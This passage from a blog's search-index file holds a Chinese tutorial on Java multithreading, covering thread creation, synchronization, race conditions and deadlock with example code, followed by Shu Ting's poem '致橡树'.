class="hljs-string">&quot;主线程逻辑&quot;</span>);    &#125;&#125;<span class="hljs-comment">//继承Thread并重写run方法</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++)&#123;            System.out.println(<span class="hljs-string">&quot;子线程逻辑&quot;</span>+i);        &#125;    &#125;&#125;</code></pre></div><p>执行后会发现先执行的<code>主线程逻辑这句话</code>，然后才是子线程逻辑。</p></li><li><p>通过Runnable接口</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadCreate2</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) &#123;                    System.out.println(<span class="hljs-string">&quot;子线程逻辑1:&quot;</span>+i);                &#125;            &#125;        &#125;;        <span class="hljs-comment">//lambda表达式</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) &#123;                System.out.println(<span class="hljs-string">&quot;子线程逻辑2:&quot;</span>+i);            &#125;        &#125;;        <span class="hljs-comment">//通过有参来实例化线程</span>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1);        <span class="hljs-comment">//启动</span>        t1.start();        System.out.println(<span class="hljs-string">&quot;主线程逻辑1&quot;</span>);        t2.start();        System.out.println(<span class="hljs-string">&quot;主线程逻辑2&quot;</span>);    &#125;&#125;</code></pre></div><p>通过多次运行能发现他们每次运行的每个线程运行时间都是不一样的，更好的感受下争抢cpu时间片这个概念。</p></li></ol><h1 id="线程的命名"><a href="#线程的命名" class="headerlink" title="线程的命名"></a>线程的命名</h1><ol><li><p>实例化对象同时通过构造方法命名</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_name</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-string">&quot;custom1&quot;</span>);        System.out.println(t1.getName());    &#125;&#125;</code></pre></div></li><li><p>Runnable接口创建同时命名</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_name</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;&#125;,<span class="hljs-string">&quot;custom2&quot;</span>);        System.out.println(t1.getName());    &#125;&#125;</code></pre></div></li><li><p>自定义线程类,实例化同时进行名称赋值</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_name</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">MyThread2</span> <span class="hljs-variable">myThread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread2</span>(<span class="hljs-string">&quot;custom3&quot;</span>);        System.out.println(myThread2.getName());    &#125;&#125;<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread2</span><span class="hljs-params">(String name)</span>&#123;        <span class="hljs-built_in">this</span>.setName(name);    &#125;&#125;</code></pre></div></li></ol><h1 id="线程的休眠"><a href="#线程的休眠" class="headerlink" title="线程的休眠"></a>线程的休眠</h1><div class="code-wrapper"><pre><code class="hljs java">Thread.sleep()</code></pre></div><p>以毫秒为单位</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_sleep</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">MyThread3</span> <span class="hljs-variable">myThread3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread3</span>();        myThread3.start();    &#125;&#125;<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread3</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;            System.out.println(i);            <span class="hljs-keyword">try</span> &#123;                Thread.sleep(<span class="hljs-number">1000</span>);            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;</code></pre></div><h1 id="线程的优先级"><a href="#线程的优先级" class="headerlink" title="线程的优先级"></a>线程的优先级</h1><p>设置线程的优先级只是去修改这个线程抢到cpu时间片的概率。<br>不代表优先级高的一定能抢到cpu时间片。<br>优先级的设置是一个(0,10]的整数，默认是5。<br>设置优先级必须要放到start之前。 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_first</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;                System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;&quot;</span>+i);            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1,<span class="hljs-string">&quot;Thread-1:&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1,<span class="hljs-string">&quot;Thread-2:&quot;</span>);        t1.setPriority(<span class="hljs-number">1</span>);        t2.setPriority(<span class="hljs-number">10</span>);        t1.start();        t2.start();    &#125;&#125;</code></pre></div><h1 id="线程的礼让"><a href="#线程的礼让" class="headerlink" title="线程的礼让"></a>线程的礼让</h1><p>让当前运行状态的线程释放自己的cpu资源，由运行状态回到就绪状态，然后重新抢cpu时间片。 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread_yield</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt;&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;                System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;&quot;</span>+i);                <span class="hljs-keyword">if</span> (i == <span class="hljs-number">3</span>)&#123;                    Thread.yield();                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1,<span class="hljs-string">&quot;thread-1:&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1,<span class="hljs-string">&quot;thread-2:&quot;</span>);        t1.start();        t2.start();    &#125;&#125;</code></pre></div><h1 id="线程的临界资源问题"><a href="#线程的临界资源问题" class="headerlink" title="线程的临界资源问题"></a>线程的临界资源问题</h1><p>线程中资源共享<br>例如一个景点的四个售票员，他们卖的票都是从一个票库里拿出来的，这个票库里的票就叫临界资源。 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScorceFilct</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化四个线程来模拟四个售票员</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">while</span> (TicketClent.restCount &gt; <span class="hljs-number">0</span>)&#123;                System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;卖出1张票，剩余&quot;</span>+ --TicketClent.restCount);            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-1&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-2&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-3&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-4&quot;</span>);        t1.start();        t2.start();        t3.start();        t4.start();    &#125;&#125;<span class="hljs-comment">//票库</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">TicketClent</span>&#123;    <span class="hljs-comment">//票库中的100张票</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">restCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;&#125;</code></pre></div><p>按照正常逻辑，最后一条输出应该是<code>Jon卖出1张票，剩余0</code>，但事实并不是这样。</p><div class="code-wrapper"><pre><code class="hljs java">System.out.println(Thread.currentThread().getName()+<span class="hljs-string">&quot;卖出1张票，剩余&quot;</span>+ --TicketClent.restCount);</code></pre></div><p>这行代码的运行是先去将TicketClent类中的restCount变量减1</p><p>先是由thread-1抢到了cpu时间片，thread-1刚去将restCount减一，还没来得及打印或者刚刚打印，就被thread-2抢走了cpu时间片（剩余99张） </p><p>thread-2刚执行完减一操作，没有来得及打印又被thread-4抢去了cpu时间片（剩余98张）（第97张在比较靠下） </p><p>thread-4也是减一完之后没有来得及打印，被thread-3抢去cpu时间片（剩余97张） </p><p>thread-3减一之后没有打印就被thread-1抢去cpu时间片（剩余96） </p><p>thread-1得到cpu时间片之后完成了减一打印一系列操作，进行了两次循环之后被thread-2抢去了cpu时间片 </p><p>thread-2得到cpu时间片之后先把没有来得及打印的东西打印出来，然后正常执行减一打印操作，一路高歌猛进。 </p><p>以此类推就能明白整个逻辑<br>（ps：thread-3，thread-4真水，前边就个抢到一次） </p><h1 id="解决临界资源问题（线程锁）"><a href="#解决临界资源问题（线程锁）" class="headerlink" title="解决临界资源问题（线程锁）"></a>解决临界资源问题（线程锁）</h1><p>临界资源问题的本质是多个线程同时访问同一个资源<br>解决方法：在某个线程访问临界资源时，在资源外边加一把锁，其他资源发现锁之后就等待，等到解锁之后再去操作资源。</p><p>线程锁： </p><div class="code-wrapper"><pre><code class="hljs java">多个同时访问临界资源的线程看到的锁需要时同一把锁</code></pre></div><h2 id="同步代码段（synchroized）"><a href="#同步代码段（synchroized）" class="headerlink" title="同步代码段（synchroized）"></a>同步代码段（synchroized）</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScorceFilct</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化四个线程来模拟四个售票员</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">while</span> (TicketClent.restCount &gt; <span class="hljs-number">0</span>)&#123;                <span class="hljs-comment">//对象锁，在括号中写对象</span>                <span class="hljs-comment">//类锁： 在括号中写类</span>                <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;&quot;</span>)&#123;                    System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;卖出1张票，剩余&quot;</span> + --TicketClent.restCount);                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-1&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-2&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-3&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-4&quot;</span>);        t1.start();        t2.start();        t3.start();        t4.start();    &#125;&#125;<span class="hljs-comment">//票库</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">TicketClent</span>&#123;    <span class="hljs-comment">//票库中的100张票</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">restCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;&#125;</code></pre></div><p>运行之后我们会发现出现负数<br>原因是当restCount为1时，其他while循环成立，线程进去之后发现锁，就会在while里边锁外边等待正在执行的线程结束释放资源解锁，解锁之后刚运行完的线程发现不满足循环条件就不会再去争抢，而在循环里边的线程不回去管restCount的值继续去执行。 </p><p>解决方法：在锁中加一个判断，判断restCount是否大于0再去执行打印即可 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScorceFilct</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化四个线程来模拟四个售票员</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">while</span> (TicketClent.restCount &gt; <span class="hljs-number">0</span>)&#123;                <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;&quot;</span>)&#123;                    <span class="hljs-keyword">if</span> (TicketClent.restCount&gt;<span class="hljs-number">0</span>) &#123;                        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;卖出1张票，剩余&quot;</span> + --TicketClent.restCount);                    &#125;                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-1&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-2&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-3&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-4&quot;</span>);        t1.start();        t2.start();        t3.start();        t4.start();    &#125;&#125;<span class="hljs-comment">//票库</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">TicketClent</span>&#123;    <span class="hljs-comment">//票库中的100张票</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">restCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;&#125;</code></pre></div><h2 id="同步方法-（使用关键字synchronized修饰的方法）"><a href="#同步方法-（使用关键字synchronized修饰的方法）" class="headerlink" title="同步方法 （使用关键字synchronized修饰的方法）"></a>同步方法 （使用关键字synchronized修饰的方法）</h2><p>静态方法：同步锁就是类锁 当前类.class<br>非静态方法：this</p><p>将买票（执行逻辑）放到一个单独的方法里边，并且用synchronized修饰</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScorceFilct</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化四个线程来模拟四个售票员</span>        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> () -&gt; &#123;            <span class="hljs-keyword">while</span> (TicketClent.restCount &gt; <span class="hljs-number">0</span>)&#123;                soidCket();            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-1&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-2&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-3&quot;</span>);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r,<span class="hljs-string">&quot;thread-4&quot;</span>);        t1.start();        t2.start();        t3.start();        t4.start();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">soidCket</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">if</span> (TicketClent.restCount&gt;<span class="hljs-number">0</span>) &#123;            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;卖出1张票，剩余&quot;</span> + --TicketClent.restCount);        &#125;    &#125;&#125;<span class="hljs-comment">//票库</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">TicketClent</span>&#123;    <span class="hljs-comment">//票库中的100张票</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">restCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;&#125;</code></pre></div><h2 id="显式（ReentrcntLock）"><a href="#显式（ReentrcntLock）" class="headerlink" title="显式（ReentrcntLock）"></a>显式（ReentrcntLock）</h2><p>创建ReentecntLock对象 在代码段前后用<br>lock（）方法（代码段前）<br>unlock（）方法（代码段后）</p><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><p>多个线程彼此持有对方需要的锁，而不去释放自己的锁 </p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadLock</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt;&#123;          <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;A&quot;</span>)&#123;              System.out.println(<span class="hljs-string">&quot;r1线程持有a锁，等待b锁&quot;</span>);              <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;B&quot;</span>)&#123;                  System.out.println(<span class="hljs-string">&quot;r1线程同时持有a，b锁&quot;</span>);              &#125;          &#125;        &#125;;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> () -&gt;&#123;            <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;B&quot;</span>)&#123;                System.out.println(<span class="hljs-string">&quot;r2线程持有b锁，等待a锁&quot;</span>);                <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;A&quot;</span>)&#123;                    System.out.println(<span class="hljs-string">&quot;r2线程同时持有a，b锁&quot;</span>);                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r2);        t1.start();        t2.start();    &#125;&#125;</code></pre></div><p>没有任何一个线程能去同时持有a锁和b锁<br>并且程序没有结束，线程都在等待对方解锁<br>我们在程序中尽量要去避免死锁</p><h1 id="解死锁"><a href="#解死锁" class="headerlink" title="解死锁"></a>解死锁</h1><p>wait：等待，Object类中的一个方法，让当前的线程，并且让出cpu资源，并且让线程进入等待队列。 </p><p>notify： 通知，Object类中的一个方法，唤醒等待队列中的一个线程，使这个线程进入锁池。</p><p>notifyAll：通知，Object类中的一个方法，唤醒等待队列的所有线程，使所以线程进入锁池。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadLock</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> () -&gt;&#123;          <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;A&quot;</span>)&#123;              System.out.println(<span class="hljs-string">&quot;r1线程持有a锁，等待b锁&quot;</span>);              <span class="hljs-keyword">try</span> &#123;                  <span class="hljs-comment">//r1释放掉A线程，并且r1进入等待队列，等待唤醒</span>                  <span class="hljs-string">&quot;A&quot;</span>.wait();              &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;                  e.printStackTrace();              &#125;              <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;B&quot;</span>)&#123;                  System.out.println(<span class="hljs-string">&quot;r1线程同时持有a，b锁&quot;</span>);              &#125;          &#125;        &#125;;        <span class="hljs-type">Runnable</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> () -&gt;&#123;            <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;B&quot;</span>)&#123;                System.out.println(<span class="hljs-string">&quot;r2线程持有b锁，等待a锁&quot;</span>);                <span class="hljs-keyword">synchronized</span> (<span class="hljs-string">&quot;A&quot;</span>)&#123;                    System.out.println(<span class="hljs-string">&quot;r2线程同时持有a，b锁</span><span class="hljs-string">                    &quot;</span>);                &#125;            &#125;        &#125;;        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r1);        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r2);        t1.start();        t2.start();    &#125;&#125;</code></pre></div><p>使用wait之后发现r2抢到了a锁和b锁，释放了b锁<br>但r1没有继续进行，而此时程序也没有正常退出。<br>是因为r1线程进入了等待队列，还没有被唤醒。<br>在r2完成之后去唤醒r1就能使r1进入b锁</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>致橡树</title>
    <link href="/article/26be181c.html"/>
    <url>/article/26be181c.html</url>
    
    <content type="html"><![CDATA[<h1 id="致橡树"><a href="#致橡树" class="headerlink" title="致橡树"></a>致橡树</h1><p>​                    舒婷</p><p>我如果爱你——<br>绝不像攀援的凌霄花，<br>借你的高枝炫耀自己；<br>我如果爱你——<br>绝不学痴情的鸟儿，<br>为绿荫重复单调的歌曲；<br>也不止像泉源，<br>常年送来清凉的慰藉；<br>也不止像险峰，<br>增加你的高度，衬托你的威仪。<br>甚至日光，<br>甚至春雨。</p><p>不，这些都还不够！<br>我必须是你近旁的一株木棉，<br>作为树的形象和你站在一起。<br>根，紧握在地下；<br>叶，相触在云里。<br>每一阵风过，<br>我们都互相致意，<br>但没有人，<br>听懂我们的言语。<br>你有你的铜枝铁干，<br>像刀，像剑，也像戟；<br>我有我红硕的花朵，<br>像沉重的叹息，<br>又像英勇的火炬。</p><p>我们分担寒潮、风雷、霹雳；<br>我们共享雾霭、流岚、虹霓。<br>仿佛永远分离，<br>却又终身相依。<br>这才是伟大的爱情，<br>坚贞就在这里：<br>爱——<br>不仅爱你伟岸的身躯，<br>也爱你坚持的位置，<br>足下的土地。</p>]]></content>
    
    
    <categories>
      
      <category>诗</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
